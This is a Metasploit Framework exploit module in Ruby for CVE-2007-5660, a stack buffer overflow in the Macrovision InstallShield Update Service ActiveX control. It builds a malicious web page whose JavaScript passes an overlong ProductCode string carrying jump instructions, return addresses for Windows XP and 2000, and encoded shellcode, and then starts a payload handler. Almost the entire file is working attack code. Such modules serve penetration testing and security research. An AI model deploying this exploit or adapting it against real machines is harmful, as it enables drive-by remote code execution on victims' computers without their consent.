##
# $Id: macrovision_downloadandexecute.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Macrovision InstallShield Update Service Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Macrovision InstallShield Update
				Service(Isusweb.dll 6.0.100.54472). By passing an overly long ProductCode string to
				the DownloadAndExecute method, an attacker may be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2007-5660' ],
					[ 'OSVDB', '38347' ],
					[ 'URL', 'http://lists.grok.org.uk/pipermail/full-disclosure/2007-December/059288.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 800,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0/SP1 Pro English',     { 'Offset' => 600, 'Ret' => 0x71aa32ad } ],
					[ 'Windows 2000 Pro English All',       { 'Offset' => 600, 'Ret' => 0x75022ac4 } ],
				],
			'DisclosureDate' => 'Oct 31 2007',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname	= rand_text_alpha(rand(100) + 1)
		strname	= rand_text_alpha(rand(100) + 1)

		# Set the exploit buffer
		sploit =  rand_text_alpha(target['Offset'])
		sploit << Rex::Arch::X86.jmp_short(6) + make_nops(2) + [target.ret].pack('V')
		sploit << p.encoded + rand_text_alpha(1200 - p.encoded.length)

		#[id(0x00000007), helpstring("method DownloadAndExecute")]
		#void DownloadAndExecute(
		#		          BSTR dispname,
		#		          BSTR ProductCode,
		#		          long MsgID,
		#		          BSTR url,
		#		          BSTR cmdline);

		# Build out the message
		content = %Q|
			<html>
			<object classid='clsid:E9880553-B8A7-4960-A668-95C68BED571E' id='#{vname}'></object>
			<script language='javascript'>
			#{strname} = new String('#{sploit}')
			#{vname}.DownloadAndExecute("", #{strname}, 0, "", "");
			</script>
			</html>
			|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
